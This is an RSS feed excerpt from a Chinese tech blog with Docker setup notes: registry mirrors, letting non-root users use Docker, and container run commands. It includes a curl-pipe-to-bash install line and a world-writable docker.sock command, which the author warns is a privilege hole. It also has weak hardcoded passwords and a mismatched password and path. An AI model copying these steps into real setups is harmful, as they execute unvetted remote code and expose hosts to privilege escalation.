<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194858</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194859</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194860</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194861</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194862</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194863</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194864</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             └─194865</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Apr</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 152345</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaa-ai</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemd[1]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> high</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> performance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> web</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reverse</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server...</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Apr</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 152345</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaa-ai</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemd[1]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Started</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> high</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> performance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> web</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reverse</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker容器集合</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E5%AE%B9%E5%99%A8%E9%9B%86%E5%90%88.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E5%AE%B9%E5%99%A8%E9%9B%86%E5%90%88.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker容器集合</source>
      <description>Docker容器集合 Docker 部署和镜像仓库优化 普通用户使用Docker 以下方法仅适用于单用户电脑，若为多用户，即有越权漏洞！！！！ Docker常用的容器 MySQL容器 使用MySQL客户端连接到数据库 一旦数据库容器启动，就可以使用安装在主机上的任何MySQL客户端应用程序以用户ID root 和密码websecret 连接到 loca...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Docker 部署和镜像仓库优化</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> get-docker.geekery.cn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mkdir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tee</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">{</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  "registry-mirrors": [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.zhai.cm",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://a.ussh.net",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.littlediary.cn",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.rat.dev",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://atomhub.openatom.cn",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.m.daocloud.io",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.1ms.run",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dytt.online",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://func.ink",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://lispy.org",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.xiaogenban1993.com",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.mybacc.com",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.yomansunter.com",</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dockerhub.websoft9.com"</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  ]</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>普通用户使用Docker</h3>
<blockquote>
<p>以下方法仅适用于单用户电脑，若为多用户，即有越权漏洞！！！！</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#使用root增加docker组.rpm或deb包默认已经创建</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> groupadd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 方法①</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 普通用户加到docker组中</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gpasswd</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">USER</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 必须切换或者退出当前账户再从新登入才会生效</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 方法②</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 给ugo都增加读写权限</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a+rw</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/run/docker.sock</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>Docker常用的容器</h2>
<h3>MySQL容器</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mysql</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      --privileged=true</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3306:3306</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /home/mysql:/val/lib/mysql</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MYSQL_ROOT_PASSWORD="1mysql."</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      --restart=always</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mysql:5.7</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>使用MySQL客户端连接到数据库</h3>
<p>一旦数据库容器启动，就可以使用安装在主机上的任何MySQL客户端应用程序以用户ID <code>root</code> 和密码<code>websecret</code> 连接到 <code>localhost:3306</code>。</p>
<p>如果你手头没有MySQL客户端，<a href="https://www.adminer.org/" target="_blank" rel="noopener noreferrer">Admineris</a>是一个轻量级的基于php的选项。它也可以作为 <a href="https://hub.docker.com/_/adminer" target="_blank" rel="noopener noreferrer">Docker image</a> ,在另一个终端中运行以下命令：</p>
<div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-javascript"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">docker</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> \</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  -</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">it</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> --</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">rm</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> --</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">name</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> adminer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> \</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  -</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">p</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8080</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8080</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">  adminer</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启动后，在浏览器中打开 <code>http://localhost:8080</code> 并输入MySQL登录凭据：</p>
<h3>MongoDB容器</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  -d</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mongodb</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /data/mongo:/data/db</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 27017:27017</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     --restart=always</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     mongo</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#进入 `mongo`</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mongosh</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#进入 admin 的数据库</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> admin</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#创建管理员用户</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">db.createUser(</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">   {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     user:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "root",</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">     pwd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "mongo",</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     roles:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">{</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> role:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "root",</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> db:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "admin"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> }</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">   }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> )</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>Alist安装</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --restart=always</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /opt/alist:/opt/alist/data</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 5244:5244</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"alist"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xhofe/alist:latest</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>获取Alist密码</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alist</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ./alist</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> admin</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>Jupyter镜像</h3>
]]></content:encoded>
    </item>
    <item>
      <title>Docker打造最小容器MiniBash</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E6%89%93%E9%80%A0%E6%9C%80%E5%B0%8F%E5%AE%B9%E5%99%A8MiniBash.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E6%89%93%E9%80%A0%E6%9C%80%E5%B0%8F%E5%AE%B9%E5%99%A8MiniBash.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker打造最小容器MiniBash</source>
      <description>Docker打造最小容器MiniBash 介绍 突发奇想，做了一个无比小的容器，仅能维持shell的正常使用，无其他功能。但是吧，它确实是小，比官方宣称的busybox都要小。 制作方法 这个最小化容器制作方法是 找到目标程序 定位动态链接库 提取所有动态连接库 封装为docker docker作为镜像导入 运行 构建 克隆单个分支 打包为docker...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>介绍</h2>
<p>突发奇想，做了一个无比小的容器，仅能维持shell的正常使用，无其他功能。但是吧，它确实是小，比官方宣称的busybox都要小。</p>
<h2>制作方法</h2>
<p>这个最小化容器制作方法是</p>
<ul>
<li>找到目标程序</li>
<li>定位动态链接库</li>
<li>提取所有动态连接库</li>
<li>封装为docker</li>
<li>docker作为镜像导入</li>
</ul>
<h2>运行</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jockerdragon/mini_bash:5.0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>构建</h2>
<p>克隆单个分支</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> clone</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --branch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mini_bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --single-branch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://github.com/Paper-Dragon/docker-sh.git</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker-sh/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>打包为docker可识别的rootfs</p>
